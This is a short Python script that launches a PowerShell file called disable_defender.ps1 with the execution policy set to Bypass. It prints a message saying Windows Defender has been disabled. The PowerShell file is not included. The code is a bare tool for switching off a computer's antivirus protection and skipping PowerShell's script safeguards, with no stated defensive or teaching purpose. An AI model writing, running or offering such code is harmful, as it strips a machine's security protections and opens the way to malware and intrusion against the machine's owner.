import subprocess

def disable_windows_defender():
    powershell_script = 'disable_defender.ps1'
    # Execute the PowerShell script using PowerShell
    try:
        subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", powershell_script], check=True)
        print("Windows Defender is disabled.")
    except subprocess.CalledProcessError as e:
        print(f"Error disabling Windows Defender: {e}")

if __name__ == "__main__":
    disable_windows_defender()
